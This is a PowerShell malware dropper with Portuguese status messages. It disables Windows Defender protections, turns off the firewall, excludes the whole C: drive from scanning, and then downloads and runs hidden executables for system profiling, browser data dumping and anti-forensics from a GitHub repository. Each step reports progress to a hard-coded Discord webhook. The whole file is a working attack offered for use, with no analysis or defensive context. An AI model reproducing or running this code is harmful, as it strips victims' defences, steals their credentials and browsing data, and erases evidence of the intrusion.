# mandante.ps1 - VERSÃO FINAL (com USERPROFILE)
$TempFolder = "$env:USERPROFILE\AppData\Local\Temp"

function Send-DiscordWebhook {
    param([string]$Message)
    $webhookUrl = "https://discord.com/api/webhooks/1527718727204999299/nVc21-8bK1MfgI1Ybw5hZYG3KU0xuEZZalMATPdxY-jJFizPZn_sZiObl0UEUaGRRMdA"
    $escaped = $Message -replace '"', '\"' -replace "`n", '\n' -replace "`r", '\r'
    $json = "{`"content`":`"$escaped`"}"
    try { Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $json -ContentType "application/json" -ErrorAction Stop | Out-Null } catch {}
}

Send-DiscordWebhook "🛡️ Desativando bloqueio à primeira vista (1/7)"
Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
Send-DiscordWebhook "🛡️ Desativando IOAV (2/7)"
Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
Send-DiscordWebhook "🛡️ Desativando escaneamento de scripts (3/7)"
Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
Send-DiscordWebhook "🛡️ Desativando envio de amostras (4/7)"
Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue
Send-DiscordWebhook "🛡️ Desativando MAPS (5/7)"
Set-MpPreference -MAPSReporting 0 -ErrorAction SilentlyContinue
Send-DiscordWebhook "🔥 Desligando Firewall (6/7)"
netsh advfirewall set allprofiles state off
Send-DiscordWebhook "📅 Adicionando exclusão do C:\ (7/7)"
$drive = [char]67 + ':\'
Add-MpPreference -ExclusionPath $drive -ErrorAction SilentlyContinue

function Download-File {
    param($url, $path)
    curl.exe -L -o $path $url
    return (Test-Path $path)
}

Send-DiscordWebhook "🖥️ Baixando sysinfo.exe..."
if (Download-File "https://github.com/gsfv/tro.j/raw/refs/heads/main/sysinfo.exe" "$TempFolder\sysinfo.exe") {
    Start-Process -FilePath "$TempFolder\sysinfo.exe" -Wait -WindowStyle Hidden
} else { Send-DiscordWebhook "❌ Falha no sysinfo.exe" }

Send-DiscordWebhook "🌐 Baixando dumpbrowserdata.exe..."
if (Download-File "https://github.com/gsfv/tro.j/raw/refs/heads/main/dumpbrowserdata.exe" "$TempFolder\dumpbrowserdata.exe") {
    Start-Process -FilePath "$TempFolder\dumpbrowserdata.exe" -Wait -WindowStyle Hidden
} else { Send-DiscordWebhook "❌ Falha no dumpbrowserdata.exe" }

Send-DiscordWebhook "🧹 Baixando antiforensics.exe..."
if (Download-File "https://github.com/gsfv/tro.j/raw/refs/heads/main/antiforensics.exe" "$TempFolder\antiforensics.exe") {
    Start-Process -FilePath "$TempFolder\antiforensics.exe" -Wait -WindowStyle Hidden
} else { Send-DiscordWebhook "❌ Falha no antiforensics.exe" }

Send-DiscordWebhook "✅ Processo concluído!"
exit
